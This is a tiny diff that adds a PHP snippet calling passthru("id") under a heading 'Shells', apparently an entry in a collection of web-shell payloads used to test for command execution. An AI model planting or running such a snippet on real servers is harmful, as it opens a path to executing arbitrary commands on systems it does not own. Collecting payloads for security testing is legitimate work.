@@ -1,1 +1,8 @@
 # Shells
+
+
+<?php
+
+passthru("id");
+
+?>
